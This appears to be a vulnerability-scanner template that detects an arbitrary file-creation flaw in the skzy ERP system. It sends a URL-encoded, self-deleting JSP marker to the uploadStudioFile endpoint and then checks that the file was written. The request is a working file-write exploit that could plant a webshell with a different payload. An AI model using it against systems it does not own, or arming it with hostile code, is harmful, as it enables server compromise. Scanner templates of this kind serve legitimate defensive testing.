id: skzy-erp-uploadStudioFile-file-creation

info:
  name: skzy ERP uploadStudioFile File Creation
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Space-time Zhiyou enterprise process management and control system has a file creation vulnerability. Attackers can create Webshells to obtain server permissions.
  reference:
    - http://www.91skzy.net/
  tags: file-creation

flow: http(1) && http(2)

http:
  - id: upload-file
    method: POST
    path:
      - '{{BaseURL}}/formservice?service=updater.uploadStudioFile'
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      content=<?xml version="1.0"?><root><filename>test.jsp</filename><filepath>./</filepath><filesize>172</filesize><lmtime>1970-01-01 08:00:00</lmtime></root><!--%3c%25 %6f%75%74%2e%70%72%69%6e%74%6c%6e%28%22%74%65%73%74%31%32%33%22%29%3b%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%46%69%6c%65%28%61%70%70%6c%69%63%61%74%69%6f%6e%2e%67%65%74%52%65%61%6c%50%61%74%68%28%72%65%71%75%65%73%74%2e%67%65%74%53%65%72%76%6c%65%74%50%61%74%68%28%29%29%29%2e%64%65%6c%65%74%65%28%29%3b %25%3e -->
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "root"

  - id: confirm-file
    method: GET
    path:
      - '{{BaseURL}}/update/temp/studio/test.jsp'
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "test123"
